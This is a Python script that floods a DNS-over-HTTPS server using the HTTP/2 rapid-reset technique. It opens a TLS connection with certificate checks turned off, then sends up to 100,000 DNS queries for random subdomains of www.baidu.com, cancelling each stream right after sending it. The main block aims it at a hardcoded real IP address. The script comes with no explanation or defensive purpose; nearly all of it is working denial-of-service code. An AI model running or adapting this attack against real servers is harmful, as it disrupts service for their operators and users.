import random
import ssl
import string
import sys
import csv
import socket
import argparse
import time
import dns.message
from datetime import datetime
from urllib.parse import urlparse
from http.client import HTTPConnection, HTTPSConnection
import base64
from dns.message import make_query
import tqdm
from h2.connection import H2Connection
from h2.config import H2Configuration
import h2.events
import httpx
import requests
import asyncio
import warnings

warnings.filterwarnings("ignore")
async def multi_h2(id_start,conn,h2_conn,host,dns_req):
    for stream_id in tqdm.tqdm(range(id_start,id_start+1000000,2)):
        #print('stream_id',stream_id)
        headers = [(':method', 'GET'), (':authority', host), (':scheme', 'https'),
                   (':path', '/dns-query' + '?dns=' + dns_req),
                   ("accept", "application/dns-message"),
                   ("content-type", "application/dns-message")]
        #print(headers)
        h2_conn.send_headers(stream_id, headers)
        conn.send(h2_conn.data_to_send())

        h2_conn.reset_stream(stream_id)
        conn.send(h2_conn.data_to_send())




def send_rst_stream_h2(host, sid,port=443, uri_path='/dns-query', timeout=5, proxy=None):
    """
    Send an RST_STREAM frame to the given host and port.
    Parameters:
        host (str): The hostname.
        port (int): The port number.
        stream_id (int): The stream ID to reset.
        uri_path (str): The URI path for the GET request.
        timeout (int): The timeout in seconds for the socket connection.
        proxy (str): The proxy URL, if any.
    Returns:
        tuple: (status, message)
        status: 1 if successful, 0 if no response, -1 otherwise.
        message: Additional information or error message.
    """

    body = make_query(qname="baidu.com", rdtype="A", want_dnssec=False).to_wire()

    #try:
    # Create an SSL context to ignore SSL certificate verification
    ssl_context = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH)
    ssl_context.options |= (
            ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
    )
    ssl_context.options |= ssl.OP_NO_COMPRESSION
    ssl_context.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20")
    ssl_context.set_alpn_protocols(['h2'])
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    # Create a connection based on whether a proxy is used
    conn = HTTPSConnection(host, port, timeout=timeout, context=ssl_context)
    conn.connect()
    #time.sleep(2)
    # Initiate HTTP/2 connection
    config = H2Configuration(client_side=True)
    h2_conn = H2Connection(config=config)
    h2_conn.initiate_connection()
    conn.send(h2_conn.data_to_send())
    #time.sleep(2)
    # Send GET request headers
    #time.sleep(2)
    # Listen for frames and send RST_STREAM when appropriate
    #print(sid)
    flag = 0
    s_time = time.time()
    #for stream_id in tqdm.tqdm(range(sid*999999,sid*999999+1000000,2)):
    for stream_id in range(sid * 999999, sid * 999999 + 200000, 2):
        # flag += 1
        # if time.time()-s_time>1:
        #     print(flag)
        #     break
        # if flag>50:
        #     data = conn.sock.recv(65535)
        #     start_time = time.perf_counter()
        #     while time.perf_counter() - start_time < 0.1:
        #         pass
            #flag = 0
        #print('stream_id',stream_id)
        suff = base64.b64encode(str(stream_id).encode("utf-8")).decode("utf-8")+ ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        message = dns.message.make_query(f"{suff}.www.baidu.com", "A")
        message.flags |= dns.flags.RD
        dns_req = base64.b64encode(message.to_wire()).decode("UTF8").rstrip("=")

        headers = [(':method', 'GET'), (':authority', host), (':scheme', 'https'),
                   (':path', uri_path + '?dns=' + dns_req),
                   ("accept", "application/dns-message"),
                   ("content-type", "application/dns-message")]

        # headers = [(':method', 'POST'), (':authority', host), (':scheme', 'https'),
        #            (':path', uri_path),
        #            ("accept", "application/dns-message"),
        #            ("content-type", "application/dns-message")]
        #print(headers)
        h2_conn.send_headers(stream_id, headers)
        conn.send(h2_conn.data_to_send())
        # h2_conn.send_data(stream_id, body)
        # conn.send(h2_conn.data_to_send())
        h2_conn.end_stream(stream_id)
        conn.send(h2_conn.data_to_send())
        # data = conn.sock.recv(100)
        # events = h2_conn.receive_data(data)
        # print('events:\n', events)
        # start_time = time.perf_counter()
        # while time.perf_counter() - start_time < 0.05:
        #     pass
        h2_conn.reset_stream(stream_id)
        conn.send(h2_conn.data_to_send())


        #break
    conn.close()
    return ("over")
    # except Exception as e:
    #     print('error------------')
    #     return (-1, f"send_rst_stream_h2 ---- {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--sid',default=1)
    args = parser.parse_args()

    targets = ["8.218.236.77"]
    #targets = ['108.61.195.177']
    for i in targets:

        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(now,f"Checking {i}...", file=sys.stderr)
        send_rst_stream_h2(i,int(args.sid))
        #print("send rst stream:", resp, err2)

